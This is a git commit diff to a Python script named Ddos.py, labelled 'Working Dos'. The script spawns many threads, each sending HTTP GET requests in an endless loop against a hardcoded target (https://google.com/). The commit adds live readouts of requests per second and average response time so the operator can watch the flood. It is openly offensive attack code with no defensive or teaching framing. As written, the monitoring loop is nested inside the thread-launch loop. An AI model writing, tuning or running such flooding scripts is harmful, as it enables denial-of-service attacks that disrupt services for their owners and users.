009cdd4ae784c61995aadd0cfbddc1b81a4617cd
JerlinJR <infodotjerlin@gmail.com>
2022-08-18 22:51:46 +0530

    Working Dos

--- Ddos.py
+++ Ddos.py
@@ -1,19 +1,57 @@
 
 import requests
 import threading
+import time
+
+l = [];  
+
+def current_milli_time():
+    return round(time.time()*1000)
+
+def current_sec_time():
+    return round(time.time())
+
+
+def countRequestPerMinute(timeTook):
+    t = current_sec_time()
+
+    l.append({
+        "time_took": timeTook,
+        "time_received": t
+    })
+
+    for e in l:
+        if current_sec_time() -e["time_received"] >= 60:
+            l.remove(e)
 
 def make_request(name):
     while True:
-        r = requests.get('Give your site here :)')
-        print("Response code: {}".format(str(r.status_code)))
-
+        s = current_milli_time()
+        r = requests.get('https://google.com/')
+        t = current_milli_time() - s
+        # print("Response code: {} Took {} ms".format(str(r.status_code),t))
+        countRequestPerMinute(t)
 
 thread = 128
-while thread >=1:
+i = 0
+while i <= thread:
 # while True:
-
-    x = threading.Thread(target=make_request,args=(thread,))
-    print("Starting thread {}".format(thread))
+    x = threading.Thread(target=make_request,args=(i,))
+    # print("Starting thread {}".format(i))
     x.start()
-    thread-=1
+    i+=1
 
+
+    print("Initial Start Please Wait..")
+    time.sleep(5)
+    while len(l) > 0:
+        time.sleep(1)
+        response_time = 0
+        for e in l:
+            response_time = response_time + e['time_took']
+        response_time = response_time / len(l)
+
+        # print("Request per second: {}".format(len(l)))
+        # print("Average Response time: {} Ms".format(round(response_time)))
+        
+        print("\rAverage response time: {} Ms and Request per/sec: {}".format(round(response_time),len(l)), end=""),
